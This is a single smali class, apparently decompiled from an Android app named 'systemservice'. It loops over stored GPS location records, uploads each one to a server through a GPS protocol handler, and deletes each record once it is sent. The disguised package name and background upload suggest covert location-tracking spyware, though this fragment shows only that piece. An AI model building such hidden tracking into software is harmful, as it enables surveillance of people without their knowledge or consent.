.class Lcom/systemservice/common/features/gpsHistory/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/features/gpsHistory/d;->a(Landroid/content/Context;Lcom/systemservice/a/h/i;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/h/i;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/systemservice/common/features/gpsHistory/d;


# direct methods
.method constructor <init>(Lcom/systemservice/common/features/gpsHistory/d;Lcom/systemservice/a/h/i;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    iput-object p2, p0, Lcom/systemservice/common/features/gpsHistory/b;->a:Lcom/systemservice/a/h/i;

    iput-object p3, p0, Lcom/systemservice/common/features/gpsHistory/b;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/b;->a:Lcom/systemservice/a/h/i;

    const/4 v1, 0x0

    invoke-virtual {v0, v1, v1}, Lcom/systemservice/a/h/i;->a(Ljava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_4

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v1}, Lcom/systemservice/common/features/gpsHistory/d;->c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "List GPS = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-virtual {v1}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v1

    check-cast v1, Lcom/systemservice/common/features/gpsHistory/e;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    const/4 v3, 0x0

    if-eqz v2, :cond_3

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/systemservice/a/e/j;

    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v4}, Lcom/systemservice/common/features/gpsHistory/d;->a(Lcom/systemservice/common/features/gpsHistory/d;)Z

    move-result v4

    const-string v5, "SEND 1 GPS Now SUCCESSFUL with ret_code "

    const-string v6, "ServerProtocolForGps"

    const/4 v7, 0x1

    if-eqz v4, :cond_1

    iget-object v3, p0, Lcom/systemservice/common/features/gpsHistory/b;->b:Landroid/content/Context;

    invoke-virtual {v1, v3, v2, v7}, Lcom/systemservice/common/features/gpsHistory/e;->a(Landroid/content/Context;Lcom/systemservice/a/e/j;I)I

    move-result v3

    if-ne v3, v7, :cond_0

    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v4}, Lcom/systemservice/common/features/gpsHistory/d;->c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;

    move-result-object v4

    const-string v7, "SEND 1 GPS Now SUCCESSFUL with ret_code"

    invoke-virtual {v4, v7}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_0
    iget-object v3, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v3}, Lcom/systemservice/common/features/gpsHistory/d;->c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;

    move-result-object v3

    const-string v4, "SEND 1 GPS Now ERROR with ret_code"

    invoke-virtual {v3, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :goto_1
    iget-object v3, p0, Lcom/systemservice/common/features/gpsHistory/b;->a:Lcom/systemservice/a/h/i;

    iget-wide v4, v2, Lcom/systemservice/a/e/j;->a:J

    invoke-virtual {v3, v4, v5}, Lcom/systemservice/a/h/i;->a(J)V

    goto :goto_0

    :cond_1
    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/b;->b:Landroid/content/Context;

    invoke-virtual {v1, v4, v2, v3}, Lcom/systemservice/common/features/gpsHistory/e;->a(Landroid/content/Context;Lcom/systemservice/a/e/j;I)I

    move-result v3

    if-ne v3, v7, :cond_2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "SEND 1 GPS SUCCESSFUL with ret_code "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v6, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v4}, Lcom/systemservice/common/features/gpsHistory/d;->c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :cond_2
    iget-object v4, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v4}, Lcom/systemservice/common/features/gpsHistory/d;->c(Lcom/systemservice/common/features/gpsHistory/d;)Lorg/apache/log4j/Logger;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "SEND 1 GPS Now ERROR with ret_code "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :goto_2
    invoke-virtual {v4, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    goto :goto_1

    :cond_3
    iget-object v0, p0, Lcom/systemservice/common/features/gpsHistory/b;->c:Lcom/systemservice/common/features/gpsHistory/d;

    invoke-static {v0, v3}, Lcom/systemservice/common/features/gpsHistory/d;->a(Lcom/systemservice/common/features/gpsHistory/d;Z)Z

    :cond_4
    return-void
.end method
